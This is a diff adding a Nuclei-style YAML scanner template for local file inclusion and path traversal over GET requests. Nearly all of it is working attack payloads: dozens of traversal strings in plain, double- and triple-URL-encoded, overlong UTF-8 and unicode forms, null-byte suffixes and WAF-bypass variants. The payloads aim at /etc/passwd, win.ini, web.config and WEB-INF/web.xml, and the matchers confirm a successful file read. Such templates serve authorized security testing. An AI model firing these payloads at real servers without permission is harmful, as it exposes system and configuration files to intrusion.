@@ -1,0 +1,134 @@
+id: lfi-get-fuzz
+
+info:
+  name: LFI GET Parameter Fuzzing
+  author: your_name
+  severity: high
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  tags: dast,pathtraversal,lfi
+
+variables:
+  fuzz: "../../../../../../../../../../../../../../../"
+  fuzz3: "//////////////////////////../../../../../../../../../../../../../../../"
+  fuzz2: "%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F"
+  fuzz4: "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F"
+  fuzz5: "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f"
+  fuzz7: "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e"
+  fuzz8: "///////////////////%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e"
+  fuzz6: "%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f"
+  fuzz_urlx2_encode: "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f"
+  fuzz_hex_unicode: "%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f"
+  fuzz_utf8_unicode: "%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF"
+  fuzz_utf8_unicode_x: "%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF"
+  fuzz_bypass_replace: ".../.../.../.../.../.../.../.../.../.../.../.../.../.../.../"
+  fuzz_bypass_replace_windows: '..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\'
+  fuzz_bypass_waf_regx: "./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../"
+  fuzz_urlx3_encode: "%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f"
+  fuzz_hex2_unicode: "%u002f%u002f%u002f%u002f%u002f%u002f%u002f%u002f%u002f%u002f%u002f%u002f%u002f%u002f%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f"
+  fuzz_utf82_unicode: "%AF%%AF%%AF%%AF%%AF%%AF%%AF%%AF%%AF%%AF%%AF%%AF%%AF%%AF%%AF%%AF%%AF%%AF%%AF%%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF"
+  fuzz_utf82_unicode_x: "%C0AF%C0AF%C0AF%C0AF%C0AF%C0AF%C0AF%C0AF%C0AF%C0AF%C0AF%C0AF%C0AF%C0AF%C0AF%C0AF%C0AF%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF"
+  fuzz_bypass2_replace: "////////////////////////.../.../.../.../.../.../.../.../.../.../.../.../.../.../.../"
+  fuzz_bypass2_replace_windows: '\\\\\\\\\\\\\\\\\\\\\\\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\'
+  fuzz_bypass2_waf_regx: "/////////////////////./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../"
+
+requests:
+  - raw:
+      - |
+        GET /{{Fuzz}} HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      Fuzz:
+        - '{{fuzz}}etc/passwd'
+        - '{{fuzz}}windows/win.ini'
+        - '{{fuzz3}}etc/passwd'
+        - '{{fuzz3}}windows/win.ini'
+        - '{{fuzz2}}etc%2Fpasswd'
+        - '{{fuzz2}}windows%2ewin.ini'
+        - '{{fuzz4}}etc%2Fpasswd'
+        - '{{fuzz4}}windows%2ewin.ini'
+        - '{{fuzz5}}etc%2Fpasswd'
+        - '{{fuzz5}}windows%2ewin.ini'
+        - '{{fuzz6}}etc%2Fpasswd'
+        - '{{fuzz6}}windows%2ewin.ini'
+        - '{{fuzz7}}etc%2Fpasswd'
+        - '{{fuzz7}}windows%2ewin.ini'
+        - '{{fuzz8}}etc%2Fpasswd'
+        - '{{fuzz8}}windows%2ewin.ini'
+        - '/etc/passwd%00.jpg'
+        - 'c:/windows/win.ini%00.jpg'
+        - '{{fuzz}}etc/passwd%00.jpg'
+        - '{{fuzz}}windows/win.ini%00.jpg'
+        - '{{fuzz_urlx2_encode}}etc%252fpasswd'
+        - '{{fuzz_urlx2_encode}}windows%252fwin.ini'
+        - '{{fuzz_hex_unicode}}etc%u002fpasswd'
+        - '{{fuzz_hex_unicode}}windows%u002fwin.ini'
+        - '{{fuzz_utf8_unicode}}etc%C0%AFpasswd'
+        - '{{fuzz_utf8_unicode}}windows%C0%AFwin.ini'
+        - '{{fuzz_utf8_unicode_x}}etc%C0AFpasswd'
+        - '{{fuzz_utf8_unicode_x}}windows%C0AFwin.ini'
+        - '{{fuzz_bypass_replace}}etc/passwd'
+        - '{{fuzz_bypass_replace}}windows/win.ini'
+        - '{{fuzz_bypass_replace_windows}}windows\win.ini'
+        - '{{fuzz_bypass_waf_regx}}etc/passwd'
+        - '{{fuzz_bypass_waf_regx}}windows/win.ini'
+        - '{{fuzz_urlx3_encode}}etc%252fpasswd'
+        - '{{fuzz_urlx3_encode}}windows%252fwin.ini'
+        - '{{fuzz_hex2_unicode}}etc%u002fpasswd'
+        - '{{fuzz_hex2_unicode}}windows%u002fwin.ini'
+        - '{{fuzz_utf82_unicode}}etc%C0%AFpasswd'
+        - '{{fuzz_utf82_unicode}}windows%C0%AFwin.ini'
+        - '{{fuzz_utf82_unicode_x}}etc%C0AFpasswd'
+        - '{{fuzz_utf82_unicode_x}}windows%C0AFwin.ini'
+        - '{{fuzz_bypass2_replace}}etc/passwd'
+        - '{{fuzz_bypass2_replace}}windows/win.ini'
+        - '{{fuzz_bypass2_replace_windows}}windows\win.ini'
+        - '{{fuzz_bypass2_waf_regx}}etc/passwd'
+        - '{{fuzz_bypass2_waf_regx}}windows/win.ini'
+        - './web.config'
+        - '../web.config'
+        - '../../web.config'
+        - './WEB-INF/web.xml'
+        - '../WEB-INF/web.xml'
+        - '../../WEB-INF/web.xml'
+        - '{{fuzz}}etc/passwd%00'
+        - '{{fuzz}}windows/win.ini%00'
+        - '{{fuzz3}}etc/passwd%00'
+        - '{{fuzz3}}windows/win.ini%00'
+        - '{{fuzz2}}etc%2Fpasswd%00'
+        - '{{fuzz2}}windows%2ewin.ini%00'
+        - '{{fuzz4}}etc%2Fpasswd%00'
+        - '{{fuzz4}}windows%2ewin.ini%00'
+        - '{{fuzz_urlx2_encode}}etc%252fpasswd%00'
+        - '{{fuzz_urlx2_encode}}windows%252fwin.ini%00'
+        - '{{fuzz_hex_unicode}}etc%u002fpasswd%00'
+        - '{{fuzz_hex_unicode}}windows%u002fwin.ini%00'
+        - '{{fuzz_utf8_unicode}}etc%C0%AFpasswd%00'
+        - '{{fuzz_utf8_unicode}}windows%C0%AFwin.ini%00'
+        - '{{fuzz_utf8_unicode_x}}etc%C0AFpasswd%00'
+        - '{{fuzz_utf8_unicode_x}}windows%C0AFwin.ini%00'
+        - '{{fuzz_bypass_replace}}etc/passwd%00'
+        - '{{fuzz_bypass_replace}}windows/win.ini%00'
+        - '{{fuzz_bypass_replace_windows}}windows\win.ini%00'
+        - '{{fuzz_bypass_waf_regx}}etc/passwd%00'
+        - '{{fuzz_bypass_waf_regx}}windows/win.ini%00'
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+      - type: word
+        part: body
+        words:
+          - 'for 16-bit app support'
+      - type: regex
+        part: body
+        regex:
+          - '(<web-app[\s\S]+<\/web-app>)'
+      - type: regex
+        part: body
+        regex:
+          - '(<system.webServer[\s\S]+<\/system.webServer>)'
